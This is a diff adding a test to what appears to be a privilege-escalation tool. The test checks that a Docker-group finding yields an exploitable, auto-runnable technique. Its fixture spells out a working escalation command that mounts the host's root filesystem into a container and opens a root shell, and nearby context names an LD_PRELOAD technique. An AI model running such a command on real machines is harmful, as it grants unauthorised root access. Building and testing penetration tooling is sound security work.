@@ -140,3 +140,18 @@ def test_setenv_awk_ld_preload_auto():
     assert finding.is_exploitable
     assert "LD_PRELOAD" in finding.best_technique.code
     assert "gcc" in finding.best_technique.code
+
+
+def test_docker_group_builtin_auto():
+    finding = Finding(
+        vector=VectorType.GROUP,
+        path="docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
+        executable="docker",
+        details="Docker group — mount host root via container",
+        severity="high",
+    )
+    finding.techniques = builtin_techniques_for(finding)
+    attach_best_techniques([finding])
+    assert finding.is_exploitable
+    assert "docker run" in finding.best_technique.code
+    assert is_auto_runnable(finding.best_technique)
